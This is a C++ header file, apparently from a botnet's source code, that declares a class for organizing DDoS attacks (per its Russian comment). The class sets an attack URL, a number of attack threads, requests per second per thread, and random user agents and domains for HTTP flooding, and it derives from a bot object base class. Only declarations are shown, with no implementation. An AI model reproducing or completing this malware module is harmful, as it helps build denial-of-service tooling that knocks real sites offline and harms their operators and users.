#ifndef DDOSClassesH
#define DDOSClassesH

//----------------------------------------------------------------------

#include "windows.h"
#include "Strings.h"
#include "GetApi.h"
#include "BotHTTP.h"
#include <WinSock.h>





// Класс организации DDOS атак
class TDDOS : public TBotObject
{
private:
	THTTPRequest FRequest;
	LPHOSTENT    FHostAddres;
	LONG         FThreadsCount;
	bool         FTerminated;
	string       FSendData;
	DWORD        FUserAgentsCount;
	DWORD        FDomainsCount;

	PCHAR GetRandomString(const PCHAR* StrArray, DWORD &ArraySize);
	friend DWORD WINAPI DDOSThreadProc(TDDOS *DDOS);
	int  MakeString(PCHAR Buf, PCHAR FormatLine, ...);
public:
	string URL;               // Адрес атаки
	DWORD  MaxThreads;        // Количество потоков атаки
	DWORD  AttemptsPerSecond; // Попыток в секунду в одном потоке

	TDDOS();
	~TDDOS();

	BOOL Execute(bool Wait);
	BOOL Busy();
	void Terminate();
};




//----------------------------------------------------------------------
#endif